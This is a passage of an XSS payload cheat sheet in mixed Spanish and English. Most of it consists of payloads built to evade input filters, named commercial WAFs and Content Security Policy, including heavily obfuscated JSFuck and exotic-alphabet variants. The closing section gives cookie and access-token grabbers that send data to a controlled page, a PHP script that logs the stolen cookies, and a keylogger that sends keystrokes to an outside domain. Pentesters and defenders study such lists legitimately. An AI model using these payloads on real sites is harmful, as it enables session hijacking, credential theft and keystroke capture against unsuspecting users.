Si se refleja, inyectar el payload que desee para XSS:

```
curl -iH "XSS: <svg onload=alert(8)>" http://example.com/test123.php?nuevoxssstored
```

Repetir hasta que se muestre "header-especial: HIT", lo cual indica que se ha almacenado hasta que caduque la caché.


## Jump to URL Fragment

Úselo cuando necesite ocultar algunos caracteres de su carga útil que activarían un WAF.

Usa el payload después del fragmento de URL (#):

```
eval(URL.slice(-8)) #alert(1)

eval(location.hash.slice(1)) #alert(1)

document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
```

## PHP Spell Checker Bypass

Úselo para omitir la función "pspell_new" de PHP, que proporciona un diccionario para intentar adivinar la entrada utilizada para la búsqueda.

Una función similar a la de Google para los campos de búsqueda:

```
<scrpt> confirm(1) </scrpt>

<scrpt>write(1)</scrpt>

<scrpt> write(1) </scrpt>
```

## Filter Bypass and exotic payloads

### Bypass case sensitive

```javascript
<sCrIpt>alert(1)</ScRipt>
```

### Bypass tag blacklist

```javascript
<script x>
	
<script x>alert('XSS')<script y>
```

### Bypass word blacklist with code evaluation

```javascript
eval('ale'+'rt(0)');

Function("ale"+"rt(1)")();

new Function`al\ert\`6\``;

setTimeout('ale'+'rt(2)');

setInterval('ale'+'rt(10)');

Set.constructor('ale'+'rt(13)')();

Set.constructor`al\x65rt\x2814\x29```;
```

### Bypass with incomplete html tag

Works on IE/Firefox/Chrome/Safari

```javascript
<img src='1' onerror='alert(0)' <
```

### Bypass quotes for string

```javascript
String.fromCharCode(88,83,83)
```

### Bypass quotes in script tag

```javascript
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

### Bypass quotes in mousedown event

You can bypass a single quote with &#39; in an on mousedown event handler

```javascript
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
```

### Bypass dot filter

```javascript
<script>window['alert'](document['domain'])</script>
```

Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`
http://www.geektools.com/cgi-bin/ipconv.cgi

### Bypass parenthesis for string

Úselo en un vector HTML o inyección de javascript cuando no se permiten paréntesis:

```javascript
alert`1`

setTimeout`alert\u0028document.domain\u0029`;

setTimeout`alert\x28document.domain\x29`

setInterval`alert\x28document.domain\x29`

setTimeout'alert\x28document.domain\x29'

setInterval'alert\x28document.domain\x29'

alert`1`

alert'1'

alert"1"

<svg onload=alert&lpar;1&rpar;>

<svg onload=alert&#40;1&#41>

(alert)(1)

a=alert,a(1)

[1].find(alert)

top["al"+"ert"](1)

top[/al/.source+/ert/.source](1)

al\u0065rt(1)

top['al\145rt'](1)

top[8680439..toString(30)](1)

holis"><svg onload=top[/al/.source+/ert/.source](1)>
```

### Bypass parenthesis and semi colon

```javascript
// From @garethheyes
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>

// From @terjanq
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>

// From @cgvwzq
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```

### Bypass onxxxx= blacklist

```javascript
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>

// Bypass onxxx= filter with a null byte/vertical tab
<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />

// Bypass onxxx= filter with a '/'
<img src='1' onerror/=alert(0) />
```

### Bypass space filter

```javascript
// Bypass space filter with "/"
<img/src='1'/onerror=alert(0)>

// Bypass space filter with 0x0c/^L
<svgonload=alert(1)>

$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```

### Bypass email filter

```javascript
"><svg/onload=confirm(1)>"@x.y
```

### Bypass document blacklist

```javascript
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
```

### Bypass using javascript inside a string

```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

### Bypass using an alternate way to redirect

```javascript
location="http://google.com"
document.location = "http://google.com"
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"
```

### Bypass using an alternate way to execute an alert

```javascript
write`XSSed!`
writeln`XSSed!`
writeln`<img/src/o&#78error=alert&lpar;1)&gt;`
write('\74img/src/o\156error\75alert\501\51\76')
"><svg/onload=writeln('\74img/src/o\156error\75alert\501\51\76')>
"><svg/onload=write('\74img/src/o\156error\75alert\501\51\76')>

window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['confirm'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```

From [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - Using global variables

The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number instead the function name**.

```javascript
cgonzalo"><svg/onload=window["alert"](window["document"]["cookie"]);>

cgonzalo"><svg/onload=self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"])>

cgonzalo"><svg/oNmOuSeOvEr=self["\x61\x6c\x65\x72\x74"](self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"])>

cgonzalo"><svg/onload=self["$"]["globalEval"]("alert(1)");>

cgonzalo"><svg/onload=self["\x24"]["\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"]("\x61\x6c\x65\x72\x74\x28\x31\x29");>

cgonzalo"><img src="self["$"]["getScript"]("https://example.com/my.js");">

---
Recorrer el array para determinar qué número es "alert":
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }

Ejecutar payload con el número encontrado:
cgonzalo"><svg/onload=self[Object.keys(self)[5]](8)>

Ejecutar en una linea todo (a veces no sirve):
cgonzalo"><script>a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")</script>
---
```

From [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

From [@404death](https://twitter.com/404death/status/1011860096685502464) tweet.

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

Bypass using an alternate way to trigger an alert

```javascript
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// Bypassed security
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

### Bypass ">" using nothing

You don't need to close your tags.

```javascript
<svg onload=alert(1)//
```

### Bypass "<" and ">" using ＜ and ＞

Unicode Character U+FF1C and U+FF1E

```javascript
＜script/src=//evil.site/poc.js＞
```

### Bypass ";" using another character

```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

### Bypass using HTML encoding

HTML entities
```javascript
&apos;-alert(1)-&apos;
```

HTML hex without zeros
```javascript
&#x27-alert(1)-&#x27
```

HTML hex with zeros
```javascript
&#x00027-alert(1)-&#x00027
```

HTML dec without zeros
```javascript
&#39-alert(1)-&#39
```

HTML dec with zeros
```javascript
&#00039-alert(1)-&#00039
```

Example:
```javascript
cgonzalo"><a href="javascript:var a='&apos;-alert(1)-&apos;'">
```

Encoded: "<svg onload=alert(1)>"
	
```javascript
cgonzalo"><iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />

cgonzalo"><iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />
```

```javascript
%26%2397;lert(1)

&#97;&#108;&#101;&#114;&#116;

></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```

### Bypass using Katana

Using the [Katakana](https://github.com/aemkei/katakana.js) library.

```javascript
cgonzalo"><svg/onload=javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()>
```

### Bypass using Cuneiform

```javascript
cgonzalo"><script>𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()</script>
```

### Bypass using Lontara

```javascript
cgonzalo"><input onfocus=ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")() </autofocus>
```

More alphabets on http://aem1k.com/aurebesh.js/#

### Bypass using ECMAScript6

```html
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
```

### Bypass using Octal encoding

```javascript
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
```

### Bypass using Unicode

```javascript
Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
transformed into U+003C LESS­THAN SIGN (<)

Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")

Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```

E.g : 
```
http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
```
%EF%BC%9E becomes >
%EF%BC%9C becomes <


Bypass using Unicode converted to uppercase

```javascript
İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%c5%bf) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k

<ſvg onload=... > become <SVG ONLOAD=...>
<ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
```

### Bypass using UTF-8

```javascript
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
```

### Bypass using UTF-16be

```javascript
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
```

### Bypass using UTF-32

```js
%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

### Bypass using weird encoding or native interpretation

```javascript
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>

<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
	
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>

<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>

<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>

<script>क='',ख=!क+क,ग=!ख+क,घ=क+{},ङ=ख
[क++],च=ख[छ=क],ज=++छ+क,झ=घ[छ+ज
],ख[झ+=घ[क]+(ख.ग+घ)[क]+ग[ज]+ङ+
च+ख[छ]+झ+ङ+घ[क]+च][झ](ग[क]+ग[
छ]+ख[ज]+च+ङ+'`एक्स०एस०एस`')``</script>

<svg onload=ꆇ='',ꉄ=!ꆇ+ꆇ,ꉦ=!ꉄ+ꆇ,ꊗ=ꆇ+{},ꀻ=ꉄ[ꆇ++],ꃋ=ꉄ[ꆚ=ꆇ],ꋕ=++ꆚ+ꆇ,ꐍ=ꊗ[ꆚ+ꋕ],ꉄ[ꐍ+=ꊗ[ꆇ]+(ꉄ.ꉦ+ꊗ)[ꆇ]+ꉦ[ꋕ]+ꀻ+ꃋ+ꉄ[ꆚ]+ꐍ+ꀻ+ꊗ[ꆇ]+ꃋ][ꐍ](ꉦ[ꆇ]+ꉦ[ꆚ]+ꉄ[ꋕ]+ꃋ+ꀻ+"(ꆇ)")()>

<script>
ⵗ='',ⵗⵗ=!ⵗ+ⵗ,ⵗⵗⵗ=!ⵗⵗ+ⵗ,ⵗⵗⵗⵗ=ⵗ+{},ⵗⵗⵗⵗⵗ=ⵗⵗ[ⵗ++],ⵗⵗⵗⵗⵗⵗ=ⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗ=ⵗ],ⵗⵗⵗⵗⵗⵗⵗⵗ=++ⵗⵗⵗⵗⵗⵗⵗ+ⵗ,ⵗⵗⵗⵗⵗⵗⵗⵗⵗ=ⵗⵗⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗ+ⵗⵗⵗⵗⵗⵗⵗⵗ],ⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗⵗⵗ+=ⵗⵗⵗⵗ[ⵗ]+(ⵗⵗ.ⵗⵗⵗ+ⵗⵗⵗⵗ)[ⵗ]+ⵗⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗⵗ]+ⵗⵗⵗⵗⵗ+ⵗⵗⵗⵗⵗⵗ+ⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗ]+ⵗⵗⵗⵗⵗⵗⵗⵗⵗ+ⵗⵗⵗⵗⵗ+ⵗⵗⵗⵗ[ⵗ]+ⵗⵗⵗⵗⵗⵗ][ⵗⵗⵗⵗⵗⵗⵗⵗⵗ](ⵗⵗⵗ[ⵗ]+ⵗⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗ]+ⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗⵗ]+ⵗⵗⵗⵗⵗⵗ+ⵗⵗⵗⵗⵗ+"(ⵗ)")()
</script>

```


### Bypass using jsfuck

Bypass using [jsfuck](http://www.jsfuck.com/)

```javascript
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```

## CSP Bypass

Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://websecblog.com/vulns/google-csp-evaluator/)

### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))

//google.com/complete/search?client=chrome&jsonp=alert(1);

```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
	
"><script/src="https://google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```

More JSONP endpoints available in [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)

### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)

Works for CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, [POC here](http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;)

```js
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```

### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)

```js
// CSP Bypass with Inline and Eval
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)

Works for CSP like `script-src self`

```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)

Works for CSP like `script-src 'self' data:`

```javascript
<script ?/src="data:+,\u0061lert%281%29">/</script>
```


## Common WAF Bypass

### Cloudflare XSS Bypasses

#### 21st April 2020

```html
<svg/OnLoad="`${prompt``}`">
```

#### 22nd August 2019

```html
<svg/onload=%26nbsp;alert`bohdan`+
```

#### 5th June 2019

```html
1'"><img/src/onerror=.1|alert``>
```

#### 3rd June 2019

```html
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```

```
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```

#### 27th February 2018

```html
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

#### 9th August 2018

```javascript
</script><svg><script>alert(1)-%26apos%3B
```

Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)

### Incapsula WAF Bypass

#### 8th March 2018

```javascript
anythinglr00</script><script>alert(document.domain)</script>uxldz

anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```

#### 11th September 2018

```javascript
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```

#### 11th May 2019

```html
<svg onload\r\n=$.globalEval("al"+"ert()");>
```

### Akamai WAF Bypass

#### 18th June 2018

```javascript
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```

#### 28th October 2018

```html
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```

### WordFence WAF Bypass

#### 12th September 2018

```javascript
<a href=javas&#99;ript:alert(1)>
```

### Fortiweb WAF Bypass

#### 9th July 2019

```javascript
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
```

## Exploit XSS

### Data grabber for XSS

Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

Write the collected data into a file.

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

### Javascript keylogger

Another way to collect sensitive data is to set a javascript keylogger.

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```
